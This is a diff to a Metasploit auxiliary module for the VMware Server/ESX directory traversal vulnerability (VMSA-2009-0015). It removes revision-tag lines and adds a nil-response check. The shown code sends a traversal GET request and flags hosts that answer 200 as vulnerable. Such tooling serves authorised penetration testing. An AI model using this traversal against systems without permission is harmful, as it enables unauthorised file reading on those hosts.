@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -22,7 +18,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'        => 'VMware Server Directory Traversal Vulnerability',
-			'Version'     => '$Revision$',
 			'Description' => 'This modules exploits the VMware Server Directory Traversal
 				vulnerability in VMware Server 1.x before 1.0.10 build 203137 and 2.x before
 				2.0.2 build 203138 on Linux, VMware ESXi 3.5, and VMware ESX 3.0.3 and 3.5
@@ -31,7 +26,6 @@ class Metasploit3 < Msf::Auxiliary
 				the gueststealer tool.',
 			'Author'      => 'CG' ,
 			'License'     => MSF_LICENSE,
-			'Version'     => '$Revision$',
 			'References'	=>
 				[
 					[ 'URL', 'http://www.vmware.com/security/advisories/VMSA-2009-0015.html' ],
@@ -58,9 +52,14 @@ class Metasploit3 < Msf::Auxiliary
 				'uri'          => trav+file,
 				'version'      => '1.1',
 				'method'       => 'GET'
-						}, 25)
+			}, 25)
 
-			if (res and res.code == 200)
+			if res.nil?
+				print_error("Connection timed out")
+				return
+			end
+
+			if res.code == 200
 				#print_status("Output Of Requested File:\n#{res.body}")
 				print_status("#{target_host}:#{rport} appears vulnerable to VMWare Directory Traversal Vulnerability")
 				report_vuln(
